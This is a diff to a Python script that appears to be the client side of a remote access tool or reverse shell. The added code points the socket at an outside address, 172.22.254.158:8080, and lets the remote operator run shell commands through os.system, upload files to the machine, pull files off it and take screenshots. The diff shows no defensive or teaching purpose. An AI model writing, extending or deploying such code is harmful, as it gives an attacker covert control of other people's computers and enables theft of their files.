@@ -20,8 +20,22 @@ def upload(file):
     client.send(f.read())
 
 
+def download(file):
+    f = open(file, 'wb')
+    client.settimeout(5)
+    chunk = client.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = client.recv(1024)
+        except socket.timeout as e:
+            break
+    client.settimeout(None)
+    f.close()
+
+
 # define remote host and port
-host = '127.0.0.1'
+host = '172.22.254.158'
 port = 8080
 
 # create socket object
@@ -35,6 +49,24 @@ while True:
         break
     elif comm == '':
         pass
+    elif comm[:2] == 'cd':
+        os.system(comm)
+    elif comm[:2] == 'up':
+        download(comm[3:])
+    elif comm[:3] == 'get':
+        try:
+            upload(comm[4:])
+        except PermissionError as e:
+            warn = f'\nError: {e}\n'
+            client.send(warn.encode())
+    elif comm[:5] == 'start':
+        os.system(comm)
+    elif comm[:4] == 'echo':
+        os.system(comm)
+    elif comm[:5] == 'touch':
+        os.system(comm)
+    elif comm[:4] == 'open':
+        os.system(comm)
     elif comm == 'screenshot':
         # take the screenshot
         screenshot()
